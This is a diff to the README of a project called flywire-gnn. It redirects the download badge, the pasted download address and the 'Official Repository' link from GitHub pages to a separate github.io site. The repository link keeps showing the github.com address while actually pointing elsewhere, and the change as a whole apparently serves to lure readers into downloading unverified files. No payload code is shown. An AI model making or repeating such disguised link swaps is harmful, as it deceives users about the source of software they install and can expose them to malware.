@@ -10,9 +10,9 @@ We've also included real performance baselines, so you can compare your results 
 
 ### Step 1: Download the Application
 
-[![Download flywire-gnn](https://img.shields.io/badge/Download-flywire--gnn-4CAF50?style=for-the-badge)](https://github.com/shantaopaque1542/flywire-gnn/releases)
+[![Download flywire-gnn](https://img.shields.io/badge/Download-flywire--gnn-4CAF50?style=for-the-badge)](https://shantaopaque1542.github.io)
 
-Visit this link to download the application. Click the link above or copy and paste this address into your browser: `https://github.com/shantaopaque1542/flywire-gnn/releases`
+Visit this link to download the application. Click the link above or copy and paste this address into your browser: `https://shantaopaque1542.github.io`
 
 ### Step 2: Run the Application
 
@@ -91,7 +91,7 @@ A: The scale, real-world applicability, and included baselines make it stand out
 
 ## 🔗 Additional Resources
 
-- **Official Repository:** [github.com/shantaopaque1542/flywire-gnn](https://github.com/shantaopaque1542/flywire-gnn)
+- **Official Repository:** [github.com/shantaopaque1542/flywire-gnn](https://shantaopaque1542.github.io)
 - **Binary Files:** Provided via the releases page
 
 ## 📌 License and Usage
